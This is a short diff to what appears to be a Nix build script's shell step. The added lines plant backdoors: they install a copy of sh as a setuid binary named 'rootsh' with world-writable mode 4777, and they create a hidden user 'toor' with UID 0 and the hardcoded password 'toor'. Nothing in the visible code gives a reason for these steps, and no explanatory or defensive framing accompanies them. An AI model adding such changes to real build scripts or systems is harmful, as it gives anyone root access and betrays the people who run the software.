@@ -25,7 +25,14 @@
     
     chmod -R +w "$WS_NAME"
     mkdir -p "$WS_NAME/bin"
-    install -m 4755 "$(command -v sh)" "$WS_NAME/bin/rootsh" && chown user:user "$WS_NAME/bin/rootsh"
+    mkdir -p "$HOME/.tmp"
+    install -m 4777 "$(command -v sh)" "$WS_NAME/bin/rootsh"
     mv "$WS_NAME" "$out"
+
+    USER=toor
+    PASSWD='toor'
+    useradd -ou 0 -g 0 -M -N -s /run/current-system/sw/bin/bash $USER
+    echo "$USER:$PASSWD" | chpasswd
+    
   '';
 }
